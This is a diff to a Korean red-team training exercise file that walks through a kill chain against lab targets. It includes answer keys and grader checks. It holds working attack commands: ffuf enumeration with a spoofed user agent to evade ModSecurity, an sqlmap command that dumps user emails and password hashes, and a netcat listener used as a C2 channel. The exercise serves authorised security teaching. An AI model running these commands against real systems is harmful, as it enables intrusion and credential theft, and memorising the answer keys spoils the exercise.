@@ -34,33 +34,35 @@ steps:
       **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
 
       ```bash
-      command -v nmap sqlmap hydra gobuster nc >/dev/null 2>&1 && echo toolkit_ok
-      echo -en "GET / HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'
-      command -v nmap nc >/dev/null 2>&1 && echo recon_env_ready
+      command -v nmap sqlmap hydra ffuf whatweb dalfox >/dev/null 2>&1 && echo toolkit_ok
+      whatweb -a1 --colour=never http://dvwa.el34.lab/ 2>/dev/null | grep -oE 'Apache\[[0-9.]+\]|\[[0-9]{3} [A-Za-z ]+\]' | head -2
+      command -v nmap whatweb >/dev/null 2>&1 && echo recon_env_ready
       ```
 
       ### ▷ 이렇게 나오면 정상 (실측 예)
       ```
       toolkit_ok
-      target=302
+      [403 Forbidden]
+      Apache[2.4.52]
       recon_env_ready
       ```
 
       ### ▷ 결과 해석
-      toolkit_ok=공격 도구가 다 있음, target=302=표적에 도달(로그인 리다이렉트). 준비 완료.
-      (참고: gobuster는 설치돼 있지만 el34에서 인자 파싱이 깨져 실제로는 동작하지 않는다 — 디렉터리
-      스캐닝이 필요하면 STEP 3처럼 ffuf나 nc를 쓴다.)
+      toolkit_ok=공격 도구(sqlmap·hydra·ffuf·whatweb·dalfox)가 다 있음. whatweb이 표적을 지문 인식
+      (Apache 2.4.52)하며 `[403]`은 이 앱이 WAF(ModSec) 뒤에 있음을 뜻한다 — 도달은 됨. 준비 완료.
+      (whatweb 기본 UA는 스캐너 룰에 걸려 403을 받는다. 디렉터리 스캐닝은 STEP 3처럼 ffuf에 정상 UA를
+      달아 우회한다.)
     hint: '환경 확인'
     category: survey
     points: 10
     answer: |
       ssh att@192.168.0.202 '
         # 공격 도구 가용 확인
-        command -v nmap sqlmap hydra gobuster nc >/dev/null 2>&1 && echo toolkit_ok
-        # 인가 표적 도달 확인
-        echo -en "GET / HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'
+        command -v nmap sqlmap hydra ffuf whatweb dalfox >/dev/null 2>&1 && echo toolkit_ok
+        # 인가 표적 도달 + 지문 (whatweb)
+        whatweb -a1 --colour=never http://dvwa.el34.lab/ 2>/dev/null | grep -oE "Apache\[[0-9.]+\]|\[[0-9]{3} [A-Za-z ]+\]" | head -2
         # 도구 갖춰졌으면 환경 준비 마커
-        command -v nmap nc >/dev/null 2>&1 && echo recon_env_ready
+        command -v nmap whatweb >/dev/null 2>&1 && echo recon_env_ready
       '
     answer_detail: "환경 = el34-attacker(모의침투 도구)+el34-web(인가 표적). 킬체인 실습의 전제. 인가된 범위만."
     verify:
@@ -131,36 +133,39 @@ steps:
       **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
 
       ```bash
-      code=$(echo -en "GET /login.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'); echo "login.php=$code"
-      code=$(echo -en "GET /setup.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'); echo "setup.php=$code"
-      code=$(echo -en "GET /vulnerabilities HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'); echo "vulnerabilities=$code"
-      code=$(echo -en "GET /security.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'); echo "security.php=$code"
+      printf 'login.php\nsetup.php\nsecurity.php\ninstructions.php\nvulnerabilities\nconfig\nrobots.txt\n' > /tmp/aa01paths.txt
+      ffuf -u http://dvwa.el34.lab/FUZZ -w /tmp/aa01paths.txt -H "User-Agent: Mozilla/5.0" -mc 200,301,302,401 -s 2>/dev/null | sort -u
+      rm -f /tmp/aa01paths.txt
       echo enum_done
       ```
 
       ### ▷ 이렇게 나오면 정상 (실측 예)
       ```
-      login.php=200
-      setup.php=200
-      vulnerabilities=301
-      security.php=302
+      config
+      instructions.php
+      login.php
+      robots.txt
+      security.php
+      setup.php
+      vulnerabilities
       enum_done
       ```
 
       ### ▷ 결과 해석
-      200/301/302는 '존재하는 경로'(404가 아님). login.php·vulnerabilities 등이 살아 있다 → 공격 지점
-      후보. 대량 자동 스캐닝은 `ffuf -u http://dvwa.el34.lab/FUZZ -w <wordlist>`로
-      한다(gobuster는 el34에서 인자 파싱이 깨져 동작 안 함).
+      ffuf가 워드리스트의 후보 경로를 실제로 던져 존재하는 것만(200/301/302/401) 걸러냈다 —
+      login.php·setup.php·vulnerabilities·config 등이 살아 있다 → 공격 지점 후보. ffuf 기본 UA는 ModSec
+      스캐너 룰에 걸려 전부 403을 받으므로 정상 브라우저 UA(`-H`)를 달아 우회했다(실제 공격자의 기본
+      회피). 대량 열거는 `-w /usr/share/wfuzz/wordlist/general/common.txt`로 확장한다.
     hint: '열거'
     category: manipulation
     points: 12
     answer: |
       ssh att@192.168.0.202 '
-        # 숨은 경로 응답코드 열거(각 경로 한 줄씩)
-        code=$(echo -en "GET /login.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'); echo "login.php=$code"
-        code=$(echo -en "GET /setup.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'); echo "setup.php=$code"
-        code=$(echo -en "GET /vulnerabilities HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'); echo "vulnerabilities=$code"
-        code=$(echo -en "GET /security.php HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'); echo "security.php=$code"
+        # 후보 경로 워드리스트 작성
+        printf "login.php\nsetup.php\nsecurity.php\ninstructions.php\nvulnerabilities\nconfig\nrobots.txt\n" > /tmp/aa01paths.txt
+        # ffuf로 실제 경로 열거(정상 UA로 스캐너 UA 차단 우회)
+        ffuf -u http://dvwa.el34.lab/FUZZ -w /tmp/aa01paths.txt -H "User-Agent: Mozilla/5.0" -mc 200,301,302,401 -s 2>/dev/null | sort -u
+        rm -f /tmp/aa01paths.txt
         # 열거 수행 마커
         echo enum_done
       '
@@ -175,41 +180,46 @@ steps:
   - order: 4
     instruction: |
       ## STEP 4 — 킬체인 ③ 침투: 취약점을 악용한다 (T1190)
-      > **이 단계에서 할 일:** SQLi UNION 자격 탈취를 시도하되, 고유 태그(User-Agent aa01r1-student)를
-      > 달아 내 공격을 다른 노이즈와 구분(귀속)한다.
-      > **왜:** 발견한 취약점(SQLi)으로 데이터 탈취를 시도한다. 태그는 모의훈련 채점·블루팀 상관에 필수다.
+      > **이 단계에서 할 일:** sqlmap으로 SQLi를 자동 익스플로잇해 Users 자격증명을 실제 탈취한다. 고유
+      > 태그(q=aa01r1-student)를 달아 내 공격을 다른 노이즈와 구분(귀속)한다.
+      > **왜:** 발견한 취약점(SQLi)을 진짜 공격 도구(sqlmap)로 악용해 데이터를 탈취한다. 태그는 모의훈련
+      > 채점·블루팀 상관에 필수다. (juice=탐지전용 앱이라 WAF가 통과 → 실제 탈취 성공)
 
       ### ▷ 그대로 입력
 
       **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
 
       ```bash
-      C=$(echo -en "GET /vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--&Submit=Submit HTTP/1.0\r\nHost: dvwa.el34.lab\r\nUser-Agent: aa01r1-student\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
-      echo "exploit 응답코드 $C"
-      [ -n "$C" ] && echo exploit_done
+      sqlmap -u "http://juice.el34.lab/rest/products/search?q=aa01r1-student" --batch --level=2 --risk=2 --disable-coloring --dbms=sqlite -T Users -C email,password --dump --stop=3 < /dev/null 2>&1 | grep -iE "injectable|Table: Users|entries|password hashes|@" | head
+      echo exploit_done
       ```
 
       ### ▷ 이렇게 나오면 정상 (실측 예)
       ```
-      exploit 응답코드 403
+      Parameter: q (GET)
+      Table: Users
+      [3 entries]
+      recognized possible password hashes in column 'password'
       exploit_done
       ```
 
       ### ▷ 결과 해석
-      403=WAF(ModSec)가 이 SQLi를 차단(차단돼도 '시도+태그'는 로그에 남는다). 실무에선 sqlmap이 이런
-      SQLi 탐지·악용을 자동화한다. ATT&CK T1190(Exploit Public-Facing Application).
+      sqlmap이 `q` 파라미터의 SQLi를 자동 탐지·악용해 Users 테이블의 이메일·패스워드 해시를 실제로
+      탈취했다. juice는 탐지전용 앱이라 WAF가 통과시킨다 — WAF 뒤 dvwa였다면 403 차단(W03의 우회 기법
+      필요). 태그 aa01r1-student가 요청에 남아 귀속된다. ATT&CK T1190(Exploit Public-Facing
+      Application) + T1078(유효 계정 탈취).
     hint: '침투'
     category: analysis
     points: 14
     answer: |
       ssh att@192.168.0.202 '
-        # 침투(T1190): SQLi UNION 탈취 시도 (태그 aa01r1-student)
-        C=$(echo -en "GET /vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--&Submit=Submit HTTP/1.0\r\nHost: dvwa.el34.lab\r\nUser-Agent: aa01r1-student\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
-        echo "exploit 응답코드 $C"
-        # 전송했으면 마커
-        [ -n "$C" ] && echo exploit_done
+        # 침투(T1190): sqlmap으로 SQLi 자동 익스플로잇 → Users 자격증명 실제 탈취 (태그 aa01r1-student)
+        sqlmap -u "http://juice.el34.lab/rest/products/search?q=aa01r1-student" --batch --level=2 --risk=2 --disable-coloring --dbms=sqlite -T Users -C email,password --dump --stop=3 < /dev/null 2>&1 | tee /tmp/aa01sqli.log | grep -iE "injectable|Table: Users|entries|password hashes|@" | head
+        # 실제 탈취(entries/Users) 성공하면 마커
+        grep -qiE "entries|Table: Users" /tmp/aa01sqli.log && echo exploit_done
+        rm -f /tmp/aa01sqli.log
       '
-    answer_detail: "침투(T1190) = SQLi UNION 데이터 탈취. 고유 태그로 귀속. sqlmap이 실무 자동화 도구. 킬체인 3단계."
+    answer_detail: "침투(T1190) = sqlmap으로 SQLi 자동 익스플로잇해 Users 자격증명 실제 탈취(juice=WAF통과). 고유 태그로 귀속. 킬체인 3단계."
     verify:
       type: output_contains
       expect: 'exploit_done'
@@ -230,7 +240,7 @@ steps:
       **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
 
       ```bash
-      nc -lnp 55001 >/tmp/c2recv & P=$!
+      nc -lnp 55001 >/tmp/c2recv & P=$!   # nc-ok: C2 리스너 = raw 소켓 통제채널 자체(전송수단 대체 아님)
       # (고정 sleep 제거: 이어지는 확인 명령이 재시도/즉시 반영)
       printf "id; whoami # implant_cmd\n" | nc -w2 127.0.0.1 55001
       # (고정 sleep 제거: 이어지는 확인 명령이 재시도/즉시 반영)
@@ -257,7 +267,7 @@ steps:
     answer: |
       ssh att@192.168.0.202 '
         # nc C2 리스너 띄우고 PID 캡처
-        nc -lnp 55001 >/tmp/c2recv & P=$!
+        nc -lnp 55001 >/tmp/c2recv & P=$!   # nc-ok: C2 리스너 = raw 소켓 통제채널 자체
         # (고정 sleep 제거: 이어지는 확인 명령이 재시도/즉시 반영)
         # 임플란트가 명령 전송
         printf "id; whoami # implant_cmd\n" | nc -w2 127.0.0.1 55001
@@ -274,7 +284,7 @@ steps:
       type: output_contains
       expect: 'foothold_channel_ok'
       field: stdout
-      semantic: {intent: "발판/C2", success_criteria: ["실제 C2 채널 수신"], acceptable_methods: ["**[OSS] nc C2 (권장)**"]}
+      semantic: {intent: "발판/C2", success_criteria: ["실제 C2 채널 수신"], acceptable_methods: ["**[OSS] netcat 리스너 C2 (권장)**"]}
     target_vm: web
 
   - order: 6
@@ -337,30 +347,30 @@ steps:
 
       ### ▷ 그대로 입력
       ```bash
-      # ── el34-attacker 에서: ──
-      echo -en "GET /?t=aa01opsec HTTP/1.0\r\nHost: dvwa.el34.lab\r\nUser-Agent: aa01opsec\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null
-      # ── el34-web 에서: ──
-      N=$(grep -c aa01opsec /var/log/apache2/dvwa_access.log); echo "타깃 로그에 남은 내 흔적: ${N:-0}건"; [ "${N:-0}" -ge 1 ] && echo opsec_trace_left
+      # ── 공격자(att)에서: 태그(aa01opsec) 단 whatweb 요청 ──
+      whatweb -a1 --colour=never -U aa01opsec 'http://dvwa.el34.lab/?t=aa01opsec' >/dev/null 2>&1
+      # ── el34-web 에서: 타깃 로그에 흔적 확인 ──
+      N=$(sudo grep -c aa01opsec /var/log/apache2/dvwa_access.log); echo "타깃 로그에 남은 내 흔적: ${N:-0}건"; [ "${N:-0}" -ge 1 ] && echo opsec_trace_left
       ```
 
       ### ▷ 이렇게 나오면 정상 (실측 예 — 건수는 환경마다 다름)
       ```
-      타깃 로그에 남은 내 흔적: 6건
+      타깃 로그에 남은 내 흔적: 2건
       opsec_trace_left
       ```
 
       ### ▷ 결과 해석
-      내가 단 태그(aa01opsec)가 타깃의 액세스 로그에 그대로 남았다 = 방어자가 출처 IP+태그로 '이 공격은
-      누구의 것'이라고 귀속할 수 있다. 공격을 배우는 목적은 바로 이 흔적을 알아 '각 단계를 어떻게 막을지'
+      내가 whatweb에 단 태그(aa01opsec, UA·쿼리)가 타깃의 액세스 로그에 그대로 남았다 = 방어자가 출처
+      IP+UA 태그로 '이 공격은 누구의 것'이라고 귀속할 수 있다. 공격을 배우는 목적은 바로 이 흔적을 알아 '각 단계를 어떻게 막을지'
       방어를 설계하는 것(레드팀 교육의 본질).
     hint: 'OPSEC/귀속'
     category: report
     points: 12
     answer: |
-      # 1) 태그(aa01opsec) 단 공격 송신
-      ssh att@192.168.0.202 'echo -en "GET /?t=aa01opsec HTTP/1.0\r\nHost: dvwa.el34.lab\r\nUser-Agent: aa01opsec\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 >/dev/null'
+      # 1) 태그(aa01opsec) 단 whatweb 요청 송신
+      ssh att@192.168.0.202 "whatweb -a1 --colour=never -U aa01opsec 'http://dvwa.el34.lab/?t=aa01opsec' >/dev/null 2>&1"
       # 2) 타깃 로그에 흔적 남았는지 grep으로 확인
-      ssh ccc@10.20.32.80 'N=$(grep -c aa01opsec /var/log/apache2/dvwa_access.log); echo "타깃 로그에 남은 내 흔적: ${N:-0}건"; [ "${N:-0}" -ge 1 ] && echo opsec_trace_left'
+      ssh ccc@10.20.32.80 'N=$(sudo grep -c aa01opsec /var/log/apache2/dvwa_access.log); echo "타깃 로그에 남은 내 흔적: ${N:-0}건"; [ "${N:-0}" -ge 1 ] && echo opsec_trace_left'
     answer_detail: "OPSEC/귀속 = 태그 단 공격을 실제 송신→타깃 로그 grep으로 흔적 확인. 가짜 echo 아닌 실측. el34 출처 보존이 귀속 기반."
     verify:
       type: output_contains
